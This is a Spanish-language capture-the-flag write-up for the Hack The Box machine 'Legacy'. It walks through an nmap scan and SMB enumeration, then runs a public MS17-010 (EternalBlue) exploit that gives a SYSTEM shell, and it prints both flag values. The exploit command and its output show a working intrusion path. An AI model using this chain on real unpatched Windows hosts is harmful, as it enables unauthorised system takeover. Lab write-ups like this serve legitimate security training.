---
title: Legacy - Easy (HTB)
permalink: /Legacy-HTB-Writeup
tags:
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p135,139,445 10.129.227.181
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 20:11 -0300
Nmap scan report for 10.129.227.181
Host is up (0.61s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-01-15T03:11:20+02:00
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:95:95:8c (VMware)
|_clock-skew: mean: 5d00h59m12s, deviation: 1h24m49s, median: 4d23h59m13s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.37 seconds
```
## Shell as nt authority\system
### SMB

Veo que admite `Null Session`, pero al intentar enumerar `Shares` no tengo éxito.

```bash
nxc smb 10.129.227.181 -u '' -p '' --shares             
SMB         10.129.227.181  445    LEGACY           [*] Windows 5.1 x32 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True) 
^[SMB         10.129.227.181  445    LEGACY           [+] legacy\: 
SMB         10.129.227.181  445    LEGACY           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

### MS17-10

Volviendo al escaneo de `nmap` veo que la versión de la maquina es un `Windows XP`, por lo que en internet busque con vulnerabilidades asociadas a esta versión, y se habla del Eternal Blue como siempre.

![image-center](/assets/images/Pasted image 20260109203602.png)
### Shell

Encontré este [PoC](https://github.com/h3x0v3rl0rd/MS17-010?tab=readme-ov-file) en Github con un `exploit` para esta vulnerabilidad.

Lo ejecute y obtuve una shell parecida a `psexec`, y me dio una shell como `system`, permitiéndome así, ver ambas flags.

```powershell
python3 exploit.py legacy.htb/@10.129.227.181 -target-ip 10.129.227.181 
[*] Target OS: Windows 5.1
[+] Found pipe 'browser'
[+] Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x864eada8
SESSION: 0xe2476760
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[+] current TOKEN addr: 0xe165fb60
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe165fc00
[*] overwriting token UserAndGroups
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
[!] Executing interactive programs will hang shell!
C:\WINDOWS\system32>whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>dir "C:\"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  07:30 ��                 0 AUTOEXEC.BAT
16/03/2017  07:30 ��                 0 CONFIG.SYS
16/03/2017  08:07 ��    <DIR>          Documents and Settings
15/01/2026  03:32 ��                34 kzGt
29/12/2017  10:41 ��    <DIR>          Program Files
18/05/2022  02:10 ��    <DIR>          WINDOWS
               3 File(s)             34 bytes
               3 Dir(s)   6.296.653.824 bytes free

C:\WINDOWS\system32>type "C:\Documents and Settings\Administrator\desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
C:\WINDOWS\system32>type "C:\Documents and Settings\john\desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
```

`~Happy Hacking.`